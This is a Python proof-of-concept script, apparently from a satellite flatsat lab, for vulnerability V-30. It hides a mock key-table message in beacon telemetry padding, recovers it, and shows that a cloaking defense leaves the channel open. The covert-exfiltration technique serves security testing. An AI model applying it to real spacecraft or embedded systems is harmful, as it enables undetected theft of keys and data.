#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys, struct
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


# V-30  Covert channel inside TM padding: COVERT_ENQ queues bytes, the
# beacon 'padding' mode drains 43 B per frame -> a side channel that
# rides the legitimate downlink without changing any mission value.
# SPARTA: EX-0006 (covert transmission) / Hidden Channel
MSG = (b"EXFIL::SDLS_KEYTABLE::00*128NULL::"
       b"LINKKEY=PWNsatLabKey1234::EOT")

def drain_beacons(dev, secs):
    out = bytearray()
    dev.tc(0x05, b"\x01", via="usb")
    for _ in range(secs):
        for t in dev.find(dev.advance(1100), 0x01):
            if t.payload[1:7] == b"Beacon":
                out += t.payload[21:64]
    return bytes(out)

def main(dev, ev):
    q0 = dev.find(dev.tc(0x22, b"", via="radio"), 0x22)[0]
    ev.log(f"covert queue baseline: {struct.unpack('>H', q0.payload[2:4])[0]} B")
    r = dev.find(dev.tc(0x22, MSG, via="radio"), 0x22)[0]
    qlen = struct.unpack(">H", r.payload[2:4])[0]
    check(r.u8(1) == 1 and qlen == len(MSG), f"queued ({qlen} B)")
    dev.tc(0x21, b"\x02", via="radio")               # padding mode = covert FIFO
    got = drain_beacons(dev, 2)
    exfil = got[:len(MSG)]
    ev.log(f"recovered from beacon padding: {exfil!r}")
    check(exfil == MSG, "100% of the message exfiltrated via padding")
    rate = len(MSG) / 2.0
    ev.log(f"channel: {rate:.0f} B/s on the 1 s beacon (vs ~64 B/s total "
           f"beacon rate -> ~66% of beacon payload, mission-invisible)")
    # defense: beacon cloaking hides metadata -- but NOT the padding drain
    dev.tc(0x25, bytes([0, 0x82]), via="usb")        # CLOAK | ANOMALY
    dev.tc(0x22, b"SECOND-HOP", via="radio")
    got2 = drain_beacons(dev, 2)
    ev.log(f"with DEF_CLOAK: metadata bytes 8:21 zeroed, padding still "
           f"carries {got2[:9]!r} -> defense gap")
    check(b"SECOND-HOP" in got2, "cloaking does not close the padding drain")
    dev.tc(0x25, bytes([0, 0x80]), via="usb")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V-30 steganographic padding channel", main))
